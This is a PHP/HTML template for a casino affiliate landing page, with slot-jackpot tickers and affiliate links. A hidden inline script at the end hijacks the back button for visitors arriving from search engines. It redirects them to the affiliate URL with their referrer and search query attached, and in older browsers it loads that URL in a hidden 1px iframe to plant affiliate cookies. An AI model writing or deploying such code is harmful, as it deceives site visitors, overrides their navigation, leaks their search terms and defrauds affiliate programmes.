<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">

<meta http-equiv="Content-Type" content="text/html;charset=UTF-8">


<?PHP include_once TEMPLATE_DIR.'/head.php'; ?>

<body>

	<?PHP include_once TEMPLATE_DIR.'/header.php'; ?>
    
<?PHP 
		$i = 0;
		$count = 4;
		foreach(brands_list() as $brand ):			
		$i++;
		if ($i == 1) { 

			$link = str_replace("href=", "", $brand->aff_link_part(aff_url));
			$link = str_replace("\"", "", $link);
			$link = str_replace("target=_blank", "", $link);
?>    
     
<!-- PROMO -->
<div id="header-promo" class="visible-desktop">
	<div class="container">
    	<div class="row">
        	<p class="desc"><?=t(T_DESC_TITLE)?></p> 
        </div>
        <div class="row" onClick="ga('send', 'event', {eventCategory: 'click',eventAction: 'jackpot', eventLabel: ''});">
        	<div class="span4 jackpot">
            	<a <?=$brand->aff_link_part()?> target="_blank" rel="nofollow">
                <img src="<?=TEMPLATE?>/img/molah.png">
                <span class="game-name">Mega Molah</span>
				<script type="text/javascript" src="https://www.tickerassist.co.uk/ProgressiveTickers/include/js/ProgressiveTickersControl.js?progid=15-tdk&font-color=black&showlogo=no&currency=EUR"></script>
                </a>	
            </div>
            <div class="span4 device">
            	<a <?=$brand->aff_link_part()?> target="_blank" rel="nofollow">
            	<img src="<?=TEMPLATE?>/img/cashalot.png">
                <span class="game-name">King Cashalot</span>
				<script type="text/javascript" src="https://www.tickerassist.co.uk/ProgressiveTickers/include/js/ProgressiveTickersControl.js?progid=12&font-color=black&showlogo=no&currency=EUR"></script>             	</a> 
                
            </div>
            <div class="span4 promo">
            	<a <?=$brand->aff_link_part()?> target="_blank" rel="nofollow">
            	<img src="<?=TEMPLATE?>/img/cashalot.png">
                <span class="game-name">King Cashalot</span>
				<script type="text/javascript" src="https://www.tickerassist.co.uk/ProgressiveTickers/include/js/ProgressiveTickersControl.js?progid=11&font-color=black&showlogo=no&currency=EUR"></script>
                </a>
            </div>
        </div>
    </div>
</div>
 
 
 <?PHP  } endforeach; ?>
	
<!-- MAIN CONTENT -->
<div id="main">
	<div class="container">
        <div class="row">
        
        <div class="list-title"><h2><?=t(T_TITLE)?></h2></div>   
	
		<?PHP include_once TEMPLATE_DIR.'/table.php'; ?>
		
			
		</div>
    </div>
</div>

<!--<?PHP include_once TEMPLATE_DIR.'/popup.php'; ?> -->

<div class="footer-img"></div>
	
</div>
<footer>
	<div class="container">
        <div class="row">
        	<div class="span12">
        		
 			</div>
		</div>
    </div>
</footer>


<!--<?PHP echo $lang; ?>-->

<script>
 $(document).ready(function()
   {
      $('[href$="<?=LNG?>"]').addClass('active'); 
	  
   });
	
	/*alert('<?=$link?>');*/

(function() {	
	
    var aim_url         = "<?=$link?>";
    var SID             = "3565754fb6af92d36e8dd5def6f54130";

    function extractQuery()
    {
        var url         = [];
        var param       = [];

        url[0]          = "www.google.com";     param[0]        = "q";
        url[1]          = "search.yahoo.com";   param[1]        = "p";
        url[2]          = "www.bing.com";       param[2]        = "q";
        url[3]          = "www.google.";        param[3]        = "q";
        url[4]          = "www.ask.com";        param[4]        = "q";
        url[5]          = "search.live.com";    param[5]        = "q";
        url[6]          = "www.altavista.com";  param[6]        = "q";
        url[7]          = "search.aol.com";     param[7]        = "query";
        url[8]          = "yandex.ru";          param[8]        = "text";

        var ref         = document.referrer;

        if (ref)
        {
            for (var cnt = 0; cnt < url.length; cnt++)
            {
                var curl = url[cnt];
                var pos = ref.indexOf(curl);
                if (pos !== -1)
                {
                    var query = "";
                    pos = ref.indexOf("?");
                    if (pos !== -1)
                    {
                        query = ref.substring(pos + 1, ref.length);
                    }
                    var kvp = query.split("&");
                    for (var cnt2 = 0; cnt2 < kvp.length; cnt2++)
                    {
                        var kv = kvp[cnt2].split("=");
                        if (kv !== null && kv.length === 2)
                        {
                            if (kv[0] === param[cnt])
                            {
                                query = kv[1];
                                return query;
                            }
                        }
                    }
                }
            }
        }
        return null;
    }

    window.GG           = {};

    GG.setCookie        = function(name, value)
    {
        var argc        = arguments.length;
        var path        = '/';
        var expires     = (argc > 3) ? arguments[3] : null;
        var domain      = (argc > 4) ? arguments[4] : null;

        document.cookie = name + "=" + escape (value)   +
            ((expires   == null) ? "" : ("; expires="   + expires.toGMTString())) +
            ((path      == null) ? "" : ("; path="      + path)) +
            ((domain    == null) ? "" : ("; domain="    + domain));
    };

    GG.getCookie = function(name)
    {
        return null;
    };

    var CookieKey       = 'b1234567890';
    var bounceOnly      = false;
    var isBounce        = !GG.getCookie(CookieKey);

    GG.setCookie(CookieKey, 1);

    if(history.pushState)
    {
      window.addEventListener('popstate', function(e)
      {
          var state     = e.state;
          if (!state || state.s) { return; }
          if (bounceOnly && !isBounce) { window.history.go(-1); return; }
          if (state.f && state.next) { GG.setCookie(bounceOnly, 0); setTimeout(function () { window.location.replace(state.next); }, 10); }
      });
    }

    if (bounceOnly && !isBounce) { return; }

    var gg_r            = document.referrer;
    var loc_url         = window.location.href;
    var q               = extractQuery();

    var gg_vr           = ['.google.', '.bing.', 'yandex.'];
    var gg_go           = false;

    // Find google
    for (var w in gg_vr)
    {
        if (!gg_vr.hasOwnProperty(w))
        {
            continue;
        }
        if (gg_r.indexOf(gg_vr[w]) != -1)
        {
            gg_go = gg_vr[w];
            break;
        }
    }

    if (history.pushState)
    {
        if (!history.state)
        {
            history.replaceState
            ({
                f:      1,
                next:   aim_url + "?s=" + gg_go + "&ref=" + gg_r + "&q=" + q
             },
            window.title
            );
            history.pushState({s: 1}, window.title);
        }
    }
    else
    {
        var go = 0;
        var ch = setInterval(function()
        {
            try
            {
                go++;

                if (go > 80)
                {
                    clearInterval(ch);
                    return;
                }

                var body                    = document.getElementsByTagName("body")[0];

                if (!body)
                {
                    return;
                }

                clearInterval(ch);

                var iframe                  = document.createElement("iframe");
                iframe.style.visibility     = "hidden";
                iframe.style.position       = "absolute";
                iframe.style.width          = "1px";
                iframe.style.height         = "1px";
                iframe.src                  = aim_url;

                body.appendChild(iframe);

            } catch (e) {
            }
        }, 50);
    }
})();

	</script>
</body>
</html>